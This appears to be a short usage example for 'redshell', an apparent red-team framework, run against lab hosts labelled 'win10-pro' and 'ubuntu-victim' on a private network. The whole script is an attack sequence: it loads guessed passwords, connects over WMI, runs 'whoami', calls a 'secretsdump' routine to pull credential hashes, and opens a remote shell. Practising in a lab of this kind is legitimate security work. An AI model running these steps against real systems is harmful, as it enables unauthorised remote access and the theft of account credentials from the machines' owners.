from redshell import RSH

rsh = RSH()

rsh.targets.append(ip_addr="192.168.56.105", hostname="win10-pro")
rsh.targets.append(ip_addr="192.168.56.108", hostname="ubuntu-victim")

target = rsh.targets['192.168.56.105']

target.credentials.append(username="vboxuser", ctype="password", cred="changeme")
target.credentials.append(username="dev", ctype="password", cred="password123")
target.credentials.append(username="flkjs", ctype="password", cred="password1232453")

target.methods.append(method='wmi', cred=target.credentials[0])
target.methods.append(method='wmi', cred=target.credentials[1])
target.methods.append(method='wmi', cred=target.credentials[2])

m = target.methods[0]

m.connect()

m.run_command("whoami")

m.builtins('secretsdump')

m.shell()

m.disconnect()
